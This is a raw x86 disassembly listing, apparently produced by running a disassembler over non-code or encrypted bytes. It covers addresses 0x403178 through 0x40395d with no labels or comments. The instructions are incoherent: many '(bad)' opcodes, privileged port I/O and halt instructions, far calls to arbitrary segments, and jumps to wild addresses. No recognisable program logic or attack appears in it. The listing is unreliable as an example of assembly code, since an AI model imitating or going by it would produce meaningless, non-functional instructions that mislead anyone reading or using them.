  403178:	fist   WORD PTR [edi+0x62456c1d]
  40317e:	in     eax,0xf3
  403180:	div    esp
  403182:	and    DWORD PTR [edi+0x4eae85f6],0xffffffbe
  403189:	inc    esi
  40318a:	lea    esi,[esi-0x4e]
  40318d:	shr    bh,0x21
  403190:	dec    esp
  403191:	enter  0xff58,0xbc
  403195:	bound  esi,QWORD PTR [ecx+0x62]
  403198:	sbb    BYTE PTR [esi],ah
  40319a:	test   al,cl
  40319c:	cli    
  40319d:	xchg   eax,ecx
  40319f:	aaa    
  4031a0:	push   ss
  4031a1:	push   ss
  4031a2:	hlt    
  4031a3:	jmp    0x2cc84ff5
  4031a8:	pop    es
  4031a9:	pop    esi
  4031aa:	mov    BYTE PTR [eax-0x4749b552],bh
  4031b0:	cs hlt 
  4031b2:	jae    0x40320a
  4031b4:	mov    al,ds:0xbbeac8af
  4031b9:	sub    bh,bl
  4031bb:	stc    
  4031bc:	sbb    ebp,esi
  4031be:	fcomp  QWORD PTR [edi+eiz*1]
  4031c1:	add    al,0xda
  4031c3:	xchg   ebp,eax
  4031c4:	fadd   DWORD PTR [ecx-0x269fd79]
  4031ca:	and    BYTE PTR [esp+esi*8+0x6bdfe8d],0x85
  4031d2:	aaa    
  4031d3:	dec    esp
  4031d4:	dec    eax
  4031d5:	clc    
  4031d6:	xchg   esp,eax
  4031d7:	push   edi
  4031d8:	sbb    ebp,DWORD PTR [edi+ebp*1-0x252d3374]
  4031df:	idiv   BYTE PTR [eax+eiz*1+0x61]
  4031e3:	fwait
  4031e4:	sub    al,0x90
  4031e6:	dec    esp
  4031e7:	rcr    ah,0x6d
  4031ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031eb:	adc    eax,0x3fd6b6ee
  4031f0:	add    al,0x8a
  4031f2:	out    0xf,eax
  4031f4:	inc    ecx
  4031f5:	push   ebx
  4031f6:	pop    ds
  4031f7:	xchg   DWORD PTR [ecx-0x3c],ebp
  4031fa:	inc    ebp
  4031fb:	leave  
  4031fc:	pop    esp
  4031fd:	push   esp
  4031fe:	push   ecx
  4031ff:	jb     0x4031dc
  403201:	aad    0xaa
  403203:	inc    edi
  403204:	jns    0x4031b7
  403206:	xor    BYTE PTR [edx+0x60803ca1],0x73
  40320d:	test   DWORD PTR [ebp+0x48],ecx
  403210:	retf   0x962c
  403213:	xchg   esp,eax
  403214:	xor    eax,0x180a1824
  403219:	mov    bh,0x2a
  40321b:	cmp    al,0xec
  40321d:	ret    0xc77e
  403220:	aas    
  403221:	cmp    eax,0x6cff5c7f
  403226:	sbb    edi,ebp
  403228:	ins    DWORD PTR es:[edi],dx
  403229:	movlps QWORD PTR [esi-0x4b],xmm5
  40322d:	retf   0xf194
  403230:	mov    ebx,ebx
  403232:	jbe    0x4031ed
  403234:	pop    ecx
  403235:	(bad)  
  403236:	mov    ds:0x12ba33da,eax
  40323c:	(bad)  
  40323d:	addr16 mov bl,0x7e
  403240:	or     BYTE PTR [ebx+edx*4-0x66],dh
  403244:	icebp  
  403245:	pop    ebx
  403246:	fsubr  QWORD PTR [ecx+0x61]
  403249:	pop    ss
  40324a:	dec    edx
  40324b:	jmp    0x9ed878e1
  403250:	daa    
  403251:	push   ebx
  403252:	or     eax,esi
  403254:	in     al,0xdb
  403256:	xchg   BYTE PTR [esi-0x3825882a],dh
  40325c:	inc    ebx
  40325d:	sbb    bh,BYTE PTR [eax-0x6d]
  403260:	mov    eax,ds:0x87b601f
  403265:	gs mov ebp,cs
  403268:	pushf  
  403269:	pop    ebx
  40326a:	jns    0x4032e2
  40326c:	inc    edi
  40326d:	mov    BYTE PTR [esi-0x50b663c2],0x4c
  403274:	xchg   edx,eax
  403275:	mov    eax,ds:0xab7b6b8c
  40327a:	or     al,0xed
  40327c:	pop    eax
  40327d:	jno    0x403220
  40327f:	push   es
  403280:	inc    edx
  403281:	push   eax
  403282:	sbb    al,BYTE PTR [ecx+0x55be1efb]
  403288:	pop    ebx
  403289:	mov    ecx,0x9b0e25f1
  40328e:	mov    edx,0xfe97e378
  403293:	popa   
  403294:	add    esi,edx
  403296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403297:	adc    edx,esp
  403299:	aaa    
  40329a:	push   ebp
  40329b:	out    0x9d,eax
  40329d:	xchg   edx,eax
  40329e:	repnz (bad) 
  4032a1:	add    ebx,ebp
  4032a3:	ret    
  4032a4:	and    ebx,DWORD PTR [eax]
  4032a6:	push   ecx
  4032a7:	outs   dx,BYTE PTR ds:[esi]
  4032a8:	cli    
  4032a9:	shl    DWORD PTR [edx+edi*4],1
  4032ac:	sub    BYTE PTR [eax-0x70455fa8],ch
  4032b2:	pop    ebx
  4032b3:	or     eax,DWORD PTR [edx+0x40]
  4032b6:	mov    BYTE PTR [ecx],cl
  4032b8:	or     DWORD PTR [edi+0x7a6ea0ba],esp
  4032be:	xor    DWORD PTR [ebx+esi*4+0x5edc22e],0xffffffcf
  4032c6:	lock mov eax,0xa3e8d871
  4032cc:	and    DWORD PTR [ecx-0x43],edi
  4032cf:	lods   eax,DWORD PTR ds:[esi]
  4032d0:	ret    0x58cf
  4032d3:	call   0xff3d:0x1fe1fd55
  4032da:	push   ecx
  4032db:	mov    esi,0xaaaeff3c
  4032e0:	dec    esi
  4032e1:	or     esp,edx
  4032e3:	in     al,dx
  4032e4:	jb     0x4032c4
  4032e6:	or     al,0xcc
  4032e8:	dec    BYTE PTR [esp+edi*1]
  4032eb:	sub    DWORD PTR [edi+edx*2+0x72],esp
  4032ef:	cld    
  4032f0:	cmp    esi,DWORD PTR [ebp+0xc]
  4032f3:	sbb    ecx,ebx
  4032f5:	dec    ecx
  4032f6:	push   ebx
  4032f7:	and    DWORD PTR [ecx-0x39ff60ee],ebp
  4032fd:	in     eax,0x1c
  4032ff:	sbb    ecx,ebx
  403301:	mov    ds:0x3bc65990,al
  403306:	ficomp DWORD PTR [ebx-0xf]
  403309:	cli    
  40330a:	or     BYTE PTR [edi],dl
  40330c:	cmp    eax,0xa873d5b1
  403311:	pop    edx
  403312:	dec    edi
  403313:	xor    al,0x18
  403315:	inc    esi
  403316:	rcr    BYTE PTR [esi+0x4f],1
  403319:	xor    al,0x8c
  40331b:	fs mov dl,0x40
  40331e:	(bad)  
  40331f:	cli    
  403320:	test   eax,0x77371313
  403325:	(bad)  
  403326:	lock pop ds
  403328:	popf   
  403329:	dec    ebx
  40332a:	loope  0x403311
  40332c:	fisttp QWORD PTR [esi]
  40332e:	mov    BYTE PTR [esi],al
  403330:	xchg   esp,eax
  403331:	outs   dx,DWORD PTR ds:[esi]
  403332:	je     0x40331a
  403334:	jge    0x40335c
  403336:	mov    dh,0xb1
  403338:	or     eax,0x47312a08
  40333d:	xor    BYTE PTR [ecx],al
  40333f:	adc    bh,BYTE PTR [ebp+0x50]
  403342:	dec    esi
  403343:	ret    
  403344:	out    0x3b,al
  403346:	inc    ebp
  403347:	xchg   BYTE PTR [ebx],dl
  403349:	in     al,0xe1
  40334b:	shl    BYTE PTR [esi+edx*1+0x59c992f0],0x5e
  403353:	and    esp,ebx
  403355:	ret    0xa990
  403358:	jnp    0x403302
  40335a:	gs or  eax,0x858dc693
  403360:	jge    0x40337f
  403362:	pop    es
  403363:	stc    
  403364:	add    al,cl
  403366:	or     DWORD PTR [ecx+0x27],ecx
  403369:	push   cs
  40336a:	inc    edi
  40336b:	jo     0x403306
  40336d:	inc    esp
  40336e:	push   edx
  40336f:	clc    
  403370:	sub    dh,BYTE PTR [edi-0x552e475f]
  403376:	loope  0x403386
  403378:	or     esp,DWORD PTR [ebx+0x26]
  40337b:	mov    cl,dl
  40337d:	fs jge 0x4033f7
  403380:	shl    BYTE PTR [eax],1
  403382:	jl     0x403374
  403384:	mov    bl,0xc8
  403386:	jp     0x403384
  403388:	adc    BYTE PTR [ecx],ch
  40338a:	repnz (bad) 
  40338c:	xor    eax,0x6ad64d2e
  403391:	mov    edi,0x1ac9d1f2
  403396:	es js  0x40331c
  403399:	fbld   TBYTE PTR [ecx+0xde868ad]
  40339f:	pop    esp
  4033a0:	add    eax,0x87eda57e
  4033a5:	cmc    
  4033a6:	pop    edi
  4033a7:	mov    eax,eax
  4033a9:	sbb    BYTE PTR [esi],al
  4033ab:	add    DWORD PTR [ebx-0xf],eax
  4033ae:	lea    ebx,[ecx+0x7a44bdf6]
  4033b4:	jne    0x4033df
  4033b6:	adc    eax,0x6b2ad8b1
  4033bb:	cmp    al,0x2a
  4033bd:	data16 cmp al,dl
  4033c0:	mov    ebp,0x69f2a1c2
  4033c5:	test   eax,0x47e4b5b8
  4033ca:	mov    dh,bl
  4033cc:	js     0x403439
  4033ce:	dec    eax
  4033cf:	xchg   esi,eax
  4033d0:	shl    BYTE PTR [esi],1
  4033d2:	daa    
  4033d3:	push   edi
  4033d4:	inc    ecx
  4033d5:	test   BYTE PTR [edi+0x4e28b763],ah
  4033db:	outs   dx,DWORD PTR ds:[esi]
  4033dc:	dec    ebx
  4033dd:	push   0x3e43f0b5
  4033e2:	punpckhdq mm2,mm5
  4033e5:	sbb    DWORD PTR [edi-0x7e],0xffffffaf
  4033e9:	in     eax,dx
  4033ea:	push   ss
  4033eb:	xchg   ebx,eax
  4033ec:	mov    BYTE PTR [eax-0x6f943f35],bh
  4033f2:	test   DWORD PTR [edi+0x54],ecx
  4033f5:	sbb    ch,BYTE PTR [ebx]
  4033f7:	pop    cx
  4033f9:	ins    BYTE PTR es:[edi],dx
  4033fa:	jg     0x40346c
  4033fc:	sbb    ebx,DWORD PTR [esi-0x3e]
  4033ff:	ins    DWORD PTR es:[edi],dx
  403400:	pop    ecx
  403401:	fst    DWORD PTR [esi+0x487d57]
  403407:	(bad)  
  403408:	cmp    eax,0xae5b132a
  40340d:	pop    es
  40340e:	xchg   edx,eax
  40340f:	outs   dx,BYTE PTR gs:[esi]
  403411:	jg     0x4033de
  403413:	inc    esp
  403414:	mov    ah,0xa7
  403416:	mov    eax,0x77651b36
  40341b:	dec    ebx
  40341c:	inc    ebp
  40341d:	inc    eax
  40341e:	mov    edi,0xb634ba22
  403423:	retf   0xd2a9
  403426:	jmp    0x40347a
  403428:	into   
  403429:	and    DWORD PTR [ebx+0x26],0xa0b53a75
  403430:	imul   bh
  403432:	and    BYTE PTR [esi],bl
  403434:	dec    edi
  403435:	lods   al,BYTE PTR ds:[esi]
  403436:	mov    dl,BYTE PTR [ebx]
  403438:	inc    esi
  403439:	ficom  WORD PTR [ebx-0x59]
  40343c:	push   cs
  40343d:	call   0x6301:0xe2a4791d
  403444:	std    
  403445:	or     eax,0xd28a44b
  40344a:	(bad)  
  40344b:	(bad)  
  40344c:	out    dx,eax
  40344d:	fmul   st(2),st
  40344f:	dec    esi
  403450:	sbb    eax,DWORD PTR [ebp+0x793f3974]
  403456:	scas   eax,DWORD PTR es:[edi]
  403457:	push   0x464637d2
  40345c:	xchg   esi,eax
  40345d:	outs   dx,DWORD PTR ds:[esi]
  40345e:	xlat   BYTE PTR ds:[ebx]
  40345f:	outs   dx,DWORD PTR ds:[esi]
  403460:	test   BYTE PTR [ebx+0x60],al
  403463:	sti    
  403464:	mov    ds:0xd2a50b9,eax
  403469:	xor    eax,0x1bdff79b
  40346e:	dec    ecx
  40346f:	popf   
  403470:	pop    ss
  403471:	jae    0x403405
  403473:	ja     0x4034b5
  403475:	fwait
  403476:	adc    DWORD PTR ds:0x103a9733,0xfffffff1
  40347d:	mov    esi,0xbe7e6866
  403482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403483:	pop    eax
  403484:	pop    eax
  403485:	lahf   
  403486:	pop    ebp
  403487:	ins    BYTE PTR es:[edi],dx
  403488:	jmp    0x8e13841a
  40348d:	xchg   ebx,eax
  40348e:	pop    edi
  40348f:	jmp    0x4034bc
  403491:	jp     0x403453
  403493:	cmp    edi,DWORD PTR [edi+0x72ac841d]
  403499:	mov    eax,0x193f4339
  40349e:	retf   
  40349f:	add    BYTE PTR [edi+0x511ee30e],bh
  4034a5:	push   edi
  4034a6:	icebp  
  4034a7:	push   0x53
  4034a9:	leave  
  4034aa:	into   
  4034ab:	shr    ch,1
  4034ad:	loopne 0x4034ea
  4034af:	fs sub ch,dl
  4034b2:	loopne 0x4034c0
  4034b4:	mov    eax,ds:0x5763dccb
  4034b9:	xchg   BYTE PTR [esi+0x8746f16],al
  4034bf:	lds    edi,FWORD PTR [edi+0x6c]
  4034c2:	fcom   QWORD PTR [edi]
  4034c4:	cmc    
  4034c5:	ror    dh,1
  4034c7:	cmp    al,0x3
  4034c9:	retf   0x98fa
  4034cc:	out    0x7e,eax
  4034ce:	cmp    eax,0x8c8d3398
  4034d3:	es pop edx
  4034d5:	push   ebp
  4034d6:	jge    0x40354c
  4034d8:	sub    bh,BYTE PTR ds:0x24ba5131
  4034df:	(bad)  
  4034e0:	js     0x4034d0
  4034e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034e3:	shl    DWORD PTR [esi-0x11],cl
  4034e6:	push   eax
  4034e7:	retf   0x8368
  4034ea:	and    eax,0x3d6b2367
  4034ef:	jne    0x4034f9
  4034f1:	dec    eax
  4034f2:	xchg   BYTE PTR [edx-0x1c],al
  4034f5:	dec    esp
  4034f6:	cmp    ebx,ebp
  4034f8:	and    esi,DWORD PTR [ebp+ecx*8+0x55e4b6e]
  4034ff:	sbb    BYTE PTR [edi-0x9bea5b2],ch
  403505:	pop    ebp
  403506:	pop    ds
  403507:	or     eax,0xd0e99c14
  40350c:	mov    ds:0xd5f135b1,eax
  403511:	enter  0xf9dd,0x56
  403515:	sub    DWORD PTR [edx-0x59c5a9a6],esi
  40351b:	lock sbb dh,BYTE PTR [esi-0x4]
  40351f:	jp     0x4034aa
  403521:	and    DWORD PTR [ebp-0xa],edi
  403524:	dec    ecx
  403525:	jmp    0x64fa022b
  40352a:	xchg   esi,eax
  40352b:	retf   0x9a2f
  40352e:	jcxz   0x4034f1
  403531:	icebp  
  403532:	add    eax,0xb5c3c3bd
  403537:	jae    0x4034ca
  403539:	sbb    eax,0x1febaf61
  40353e:	sahf   
  40353f:	int3   
  403540:	aad    0x49
  403542:	adc    BYTE PTR [ebx-0x54],dh
  403545:	(bad)  
  403546:	stos   DWORD PTR es:[edi],eax
  403547:	and    ebp,DWORD PTR [ebp+0x1a]
  40354a:	jb     0x403564
  40354c:	and    DWORD PTR [ecx-0x45],ecx
  40354f:	hlt    
  403550:	jae    0x4035c6
  403552:	dec    edx
  403553:	stos   DWORD PTR es:[edi],eax
  403554:	mov    dl,0x1a
  403556:	push   cs
  403557:	sbb    bh,BYTE PTR [edi+0x9]
  40355a:	mov    dh,0x40
  40355c:	(bad)  
  40355f:	pusha  
  403560:	fbstp  TBYTE PTR [esi]
  403562:	data16 jg 0x4035a0
  403565:	add    eax,0x44c1cdfd
  40356a:	lea    edx,[edx]
  40356c:	cmp    eax,0xc14e11d4
  403571:	adc    BYTE PTR [edx],0xdc
  403574:	pop    ebx
  403575:	dec    eax
  403576:	loop   0x4035c3
  403578:	or     dh,BYTE PTR [eax-0x26]
  40357b:	int3   
  40357c:	mov    esp,0xb7f0d27a
  403581:	adc    edi,ecx
  403583:	lahf   
  403584:	(bad)  [ecx]
  403586:	sub    al,0x0
  403588:	neg    DWORD PTR [ecx]
  40358a:	push   eax
  40358b:	pop    ds
  40358c:	call   DWORD PTR [esi-0x54]
  40358f:	rcr    BYTE PTR [esi],1
  403591:	ins    DWORD PTR es:[edi],dx
  403592:	inc    ebx
  403593:	pop    esi
  403594:	(bad)  
  403595:	push   ds
  403596:	rcl    BYTE PTR [ecx-0x715f0595],cl
  40359c:	rol    BYTE PTR [eax-0x6f54dba6],0xe6
  4035a3:	sub    al,0x59
  4035a5:	mov    bh,0x86
  4035a7:	arpl   cx,ax
  4035a9:	jmp    0x40361b
  4035ab:	xor    al,0xb8
  4035ad:	dec    DWORD PTR [esi+0x19f9026a]
  4035b3:	je     0x40359c
  4035b5:	mov    ch,dh
  4035b7:	daa    
  4035b8:	test   DWORD PTR [eax+eiz*1-0x113a1d6e],ebp
  4035bf:	sar    BYTE PTR [esi+0x1a94a93c],cl
  4035c5:	(bad)  
  4035c6:	loopne 0x4035e8
  4035c8:	outs   dx,BYTE PTR ds:[esi]
  4035c9:	jb     0x4035d3
  4035cb:	mov    edi,0xbc87236d
  4035d0:	pop    ss
  4035d1:	jns    0x4035b4
  4035d3:	xchg   esi,eax
  4035d4:	rcr    BYTE PTR [edi+0x5f95d7d1],cl
  4035da:	fs daa 
  4035dc:	loope  0x4035be
  4035de:	inc    esp
  4035df:	cwde   
  4035e0:	(bad)  
  4035e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035e2:	xchg   ebp,ebp
  4035e4:	jnp    0x403604
  4035e6:	mov    al,ds:0xccce033b
  4035eb:	enter  0xb706,0x1e
  4035ef:	xor    al,0xec
  4035f1:	dec    ecx
  4035f2:	push   ecx
  4035f3:	xor    bh,ah
  4035f5:	jne    0x403640
  4035f7:	div    DWORD PTR [esi-0x32]
  4035fa:	pop    esp
  4035fb:	es inc esp
  4035fd:	cli    
  4035fe:	mov    eax,?
  403600:	xchg   ebx,eax
  403601:	movd   mm6,DWORD PTR [edx+0x28]
  403605:	cwde   
  403606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403607:	sub    esp,0x65
  40360a:	cwde   
  40360b:	mov    ah,0xef
  40360d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40360f:	jbe    0x4035a3
  403611:	cmp    al,0x1a
  403613:	sbb    ebp,esi
  403615:	push   0xfa9974a7
  40361a:	icebp  
  40361b:	or     eax,0x2e9d7d93
  403620:	out    dx,eax
  403621:	adc    BYTE PTR [esi],dh
  403623:	pop    ecx
  403624:	imul   esi,ecx,0x75
  403627:	add    esi,ebp
  403629:	jnp    0x40363c
  40362b:	out    dx,eax
  40362c:	push   ecx
  40362d:	ja     0x40362b
  40362f:	inc    BYTE PTR [ecx+0x2e6d1a99]
  403635:	sbb    dh,BYTE PTR [ebx]
  403637:	aad    0x41
  403639:	inc    edx
  40363a:	ja     0x4035c4
  40363c:	adc    dl,al
  40363e:	and    al,0xc7
  403640:	das    
  403641:	out    0x7a,eax
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	jae    0x403628
  403646:	jno    0x403682
  403648:	retf   
  403649:	xor    dl,ah
  40364b:	mov    al,ds:0x47f101cb
  403650:	push   cs
  403651:	and    ah,BYTE PTR [eax+0x2b9fb355]
  403657:	retf   
  403658:	pushf  
  403659:	sub    DWORD PTR [ecx+0x1abaee3a],edx
  40365f:	(bad)  
  403660:	cwde   
  403661:	ja     0x403661
  403663:	jb     0x403602
  403665:	enter  0x385f,0xd0
  403669:	add    al,0x7f
  40366b:	mov    bh,0x83
  40366d:	daa    
  40366e:	rcl    eax,1
  403670:	adc    eax,0x6f6ebf41
  403675:	sbb    eax,0xc14ad9ac
  40367a:	test   al,0xea
  40367c:	add    al,0xd0
  40367e:	mov    ebp,0x263739d5
  403683:	add    al,0xc7
  403685:	or     DWORD PTR [esi],ecx
  403687:	push   ebp
  403688:	leave  
  403689:	(bad)  [ebx-0x10]
  40368c:	shl    DWORD PTR [ecx],0xef
  40368f:	or     al,0xef
  403691:	fild   DWORD PTR [eax+0x6ba94f0a]
  403697:	jl     0x403679
  403699:	jne    0x4036d5
  40369b:	ins    BYTE PTR es:[edi],dx
  40369c:	mov    ss,eax
  40369e:	push   esi
  40369f:	retf   0x3b04
  4036a2:	adc    BYTE PTR [ecx],bh
  4036a4:	jle    0x403721
  4036a6:	jp     0x403723
  4036a8:	inc    ebp
  4036a9:	cwde   
  4036aa:	mov    bh,0xa2
  4036ac:	mov    WORD PTR [edi+esi*1],es
  4036af:	fsubp  st(4),st
  4036b1:	sbb    edx,DWORD PTR [eax+0x3347286]
  4036b7:	out    0x62,eax
  4036b9:	dec    esp
  4036ba:	mov    edi,0x52ddc223
  4036bf:	sub    eax,0x6fcd0b7f
  4036c4:	ins    BYTE PTR es:[edi],dx
  4036c5:	mov    dl,0x52
  4036c7:	fmulp  st(6),st
  4036c9:	push   0xedafcac0
  4036ce:	call   0xef9972eb
  4036d3:	popa   
  4036d4:	sub    al,0x45
  4036d6:	xchg   ebx,eax
  4036d7:	mov    WORD PTR [ecx+0x57],?
  4036da:	out    0xbb,eax
  4036dc:	aas    
  4036dd:	shl    DWORD PTR [ecx-0x78],1
  4036e0:	and    edx,DWORD PTR [ebp-0xa]
  4036e3:	outs   dx,BYTE PTR ds:[esi]
  4036e4:	test   ch,bl
  4036e6:	data16 sbb al,ah
  4036e9:	inc    esi
  4036ea:	imul   ecx,DWORD PTR [ecx+0x7cf6dfc7],0xffffff99
  4036f1:	mov    cl,0x75
  4036f3:	jg     0x403738
  4036f5:	jbe    0x403766
  4036f7:	test   BYTE PTR [ebx-0x63841a60],al
  4036fd:	or     esi,esi
  4036ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403700:	mov    bl,0xdc
  403702:	add    al,0x95
  403704:	stos   BYTE PTR es:[edi],al
  403705:	sbb    al,BYTE PTR [eax+0x7c]
  403708:	sahf   
  403709:	(bad)  
  40370a:	in     eax,dx
  40370b:	adc    ch,BYTE PTR [ebp-0x1767a708]
  403711:	mov    eax,0xb7a65d02
  403716:	inc    edx
  403717:	arpl   sp,sp
  403719:	int3   
  40371a:	nop
  40371b:	ins    DWORD PTR es:[edi],dx
  40371c:	loop   0x4036e1
  40371e:	push   esi
  40371f:	pop    ebp
  403720:	je     0x40372f
  403722:	in     al,dx
  403723:	jecxz  0x40376a
  403725:	scas   eax,DWORD PTR es:[edi]
  403726:	rcr    BYTE PTR [esi+0x2f6ca3b0],1
  40372c:	xor    DWORD PTR [edi],edi
  40372e:	cli    
  40372f:	and    al,0xe6
  403731:	mov    edi,0x1c77422b
  403736:	inc    esp
  403737:	call   0x5633:0x3bb0ad52
  40373e:	bts    ebp,eax
  403741:	aam    0xe3
  403743:	mov    fs:0xb6fa6086,al
  403749:	pop    es
  40374a:	xor    BYTE PTR [ebx],0xfe
  40374d:	loope  0x40375f
  40374f:	inc    esi
  403750:	das    
  403751:	dec    edi
  403752:	aaa    
  403753:	sub    WORD PTR [eax+edx*2-0x5c],ax
  403758:	adc    edx,eax
  40375a:	inc    esp
  40375b:	dec    eax
  40375c:	lea    edi,[edi]
  40375e:	and    ecx,ebx
  403760:	stos   DWORD PTR es:[edi],eax
  403761:	in     eax,0x74
  403763:	mov    eax,ds:0xbfa251ed
  403768:	or     al,0x35
  40376a:	pushf  
  40376b:	je     0x4036f1
  40376d:	sub    al,0x47
  40376f:	mov    ebp,0xbb1e6722
  403774:	sbb    DWORD PTR [ecx-0x73085165],edi
  40377a:	scas   al,BYTE PTR es:[edi]
  40377b:	jl     0x403728
  40377d:	js     0x403728
  40377f:	push   ebx
  403781:	cmp    BYTE PTR [edi+0x1],0x32
  403785:	or     DWORD PTR ds:0xc8a0db01,edx
  40378b:	cmp    DWORD PTR [edx+0x403c4a69],eax
  403791:	shr    bl,0x3c
  403794:	add    DWORD PTR [esi-0x30],ebx
  403797:	push   cs
  403798:	jnp    0x4037d7
  40379a:	jmp    0xf5c6e0c2
  40379f:	fwait
  4037a0:	sbb    eax,DWORD PTR [ebp+0x38]
  4037a3:	test   BYTE PTR [ebx+0x34acafe0],0xc2
  4037aa:	fucomip st,st(2)
  4037ac:	leave  
  4037ad:	sub    dh,BYTE PTR [ecx+0x183afeda]
  4037b3:	aaa    
  4037b4:	push   ebx
  4037b5:	out    dx,eax
  4037b6:	fist   DWORD PTR [ebx-0x46efe0a0]
  4037bc:	dec    edi
  4037bd:	inc    eax
  4037be:	mov    esi,0x1243a38
  4037c3:	lods   eax,DWORD PTR ds:[esi]
  4037c4:	inc    edx
  4037c5:	aaa    
  4037c6:	or     BYTE PTR [edi],al
  4037c8:	dec    ebx
  4037c9:	stos   DWORD PTR es:[edi],eax
  4037ca:	nop
  4037cb:	sbb    cl,0xbb
  4037ce:	sub    esp,esp
  4037d0:	cmp    DWORD PTR [ecx-0xc],eax
  4037d3:	nop
  4037d4:	fld    QWORD PTR [edx-0x10910ef0]
  4037da:	ret    0xc5c3
  4037dd:	(bad)  
  4037df:	call   0xf4c7:0x869efc93
  4037e6:	cmp    al,0x46
  4037e8:	sbb    eax,0xb78711fe
  4037ed:	dec    ecx
  4037ee:	scas   eax,DWORD PTR es:[edi]
  4037ef:	or     eax,0x49b43001
  4037f4:	sub    DWORD PTR [esi],esi
  4037f6:	xchg   esp,eax
  4037f7:	popf   
  4037f8:	fmul   DWORD PTR [esi+ebp*8-0x6079d25f]
  4037ff:	mov    dh,0xcb
  403801:	into   
  403802:	loop   0x4037a3
  403804:	dec    BYTE PTR [eax+0x46]
  403807:	ret    0x6426
  40380a:	add    al,0x66
  40380c:	push   eax
  40380d:	mov    cs,esi
  40380f:	mov    esi,edx
  403811:	or     dh,BYTE PTR [edi]
  403813:	stc    
  403814:	fwait
  403815:	inc    esp
  403816:	test   BYTE PTR [ebp+0x7c],0xe0
  40381a:	mov    eax,ds:0xdadea269
  40381f:	adc    eax,0xf5e8b79e
  403824:	mov    DWORD PTR [ecx-0x5a],edx
  403827:	sub    BYTE PTR [edi],cl
  403829:	sub    eax,0x632534a1
  40382e:	dec    edi
  40382f:	cmp    BYTE PTR [edi-0x1c54d101],al
  403835:	(bad)  
  403836:	(bad)  
  403837:	xor    al,0x31
  403839:	inc    esp
  40383a:	neg    DWORD PTR [eax-0x2c]
  40383d:	mov    cl,0xec
  40383f:	cmp    BYTE PTR [ebx],dl
  403841:	lea    eax,[esi+0x71cedd9]
  403847:	sbb    edi,ebx
  403849:	jge    0x403874
  40384b:	shl    BYTE PTR [ebx+0x1e],cl
  40384e:	aam    0xb8
  403850:	adc    DWORD PTR [esp+ecx*4],0xcabe7500
  403857:	mov    ch,0xc8
  403859:	pop    ss
  40385a:	mov    BYTE PTR [ecx-0x4c],bh
  40385d:	rol    BYTE PTR [edx],cl
  40385f:	and    dl,ah
  403861:	jne    0x403852
  403863:	iret   
  403864:	mov    esi,edi
  403866:	loopne 0x4037ed
  403868:	mov    cl,0x7c
  40386a:	mov    ch,0x3d
  40386c:	mov    al,0x4
  40386e:	and    eax,0xd1a7c1db
  403873:	sbb    DWORD PTR [ecx+0x5ef2c00a],eax
  403879:	adc    esi,DWORD PTR [eax-0x4c33e6f5]
  40387f:	jmp    0x403883
  403881:	sub    DWORD PTR [edi+0x6b],ebx
  403884:	mov    ch,BYTE PTR [eax-0x37]
  403887:	inc    edx
  403888:	ret    
  403889:	ret    
  40388a:	bound  esp,QWORD PTR [edi+esi*1+0x157775eb]
  403891:	and    ebp,DWORD PTR [ecx+ecx*4-0x6e72d34b]
  403898:	cmc    
  403899:	cmp    esi,eax
  40389b:	mov    dl,0xfb
  40389d:	cmp    dl,BYTE PTR [edi+eiz*2-0x5bac5fe7]
  4038a4:	stos   BYTE PTR es:[edi],al
  4038a5:	push   edx
  4038a6:	cmp    BYTE PTR [esi-0x3d],dl
  4038a9:	push   esi
  4038aa:	jne    0x403857
  4038ac:	pop    esi
  4038ad:	hlt    
  4038ae:	pop    ebp
  4038af:	and    DWORD PTR [edi],0xffffff95
  4038b2:	add    al,dh
  4038b4:	call   0x350c:0xa23f1cef
  4038bb:	sahf   
  4038bc:	or     ebp,DWORD PTR [ebp-0x4df569e9]
  4038c2:	mov    ebx,DWORD PTR [ecx+0xe]
  4038c5:	mov    edi,0xc851a745
  4038ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038cb:	add    eax,0x21e39e11
  4038d0:	mov    ebx,0x90ba1e88
  4038d5:	xchg   esp,eax
  4038d6:	adc    al,0x75
  4038d8:	dec    ecx
  4038d9:	cwde   
  4038da:	(bad)  
  4038db:	sti    
  4038dc:	and    eax,0x32aab174
  4038e1:	rcr    BYTE PTR [ebx],0x5f
  4038e4:	jl     0x4038e3
  4038e6:	pop    eax
  4038e7:	push   eax
  4038e8:	jno    0x4038f9
  4038ea:	push   ds
  4038eb:	test   eax,0x5b1c1d80
  4038f0:	retf   0x1bea
  4038f3:	aad    0x27
  4038f5:	je     0x4038dc
  4038f7:	inc    edx
  4038f8:	ret    0x6aee
  4038fb:	loope  0x403966
  4038fd:	mov    edx,eax
  4038ff:	add    al,0x2f
  403901:	pop    ds
  403902:	fdivr  QWORD PTR [eax+0x701b80e1]
  403908:	sbb    DWORD PTR [esi],ecx
  40390a:	test   cl,al
  40390c:	loopne 0x40397b
  40390e:	mov    ebx,0x9f6141da
  403913:	mov    eax,ds:0x4ed53af3
  403918:	sti    
  403919:	or     ah,ah
  40391b:	sbb    DWORD PTR [ecx+esi*2-0x6b392f4b],esi
  403922:	jg     0x403932
  403924:	addr16 dec edx
  403926:	loopne 0x4038dd
  403928:	xlat   BYTE PTR ds:[bx]
  40392a:	dec    ebx
  40392b:	in     al,0xd5
  40392d:	jb     0x403909
  40392f:	mov    eax,0xfc8402a4
  403934:	ficomp WORD PTR [esi-0x2d93050a]
  40393a:	ror    eax,cl
  40393c:	mov    eax,0xc931461a
  403941:	add    ebx,edi
  403943:	dec    esp
  403944:	ins    BYTE PTR es:[edi],dx
  403945:	scas   eax,DWORD PTR es:[edi]
  403946:	aam    0x28
  403948:	adc    al,BYTE PTR [ecx]
  40394a:	or     DWORD PTR [edx+0x25b41d47],0xffffffc6
  403951:	icebp  
  403952:	mov    eax,0x4a81d287
  403957:	push   eax
  403958:	(bad)  
  403959:	dec    ecx
  40395a:	xchg   esi,eax
  40395b:	scas   al,BYTE PTR es:[edi]
  40395c:	stos   BYTE PTR es:[edi],al
  40395d:	mov    BYTE PTR [ecx-0x7],ch
